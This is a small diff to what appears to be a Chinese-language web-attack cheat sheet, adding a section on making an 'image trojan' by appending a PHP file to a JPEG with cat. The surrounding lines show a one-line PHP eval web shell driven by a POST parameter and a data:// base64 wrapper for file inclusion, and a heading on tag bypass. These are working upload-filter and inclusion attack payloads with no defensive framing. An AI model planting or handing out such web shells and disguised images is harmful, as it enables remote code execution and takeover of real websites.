@@ -232,6 +232,12 @@ text=data://text/plain;base64，base64后的字符串
 <?php @eval($_POST['ac']); ?>
 ```
 
+##### 图片马的制作
+
+```
+cat 1.php 2.jpg >> 1.jpg
+```
+
 
 
 ##### 标签绕过
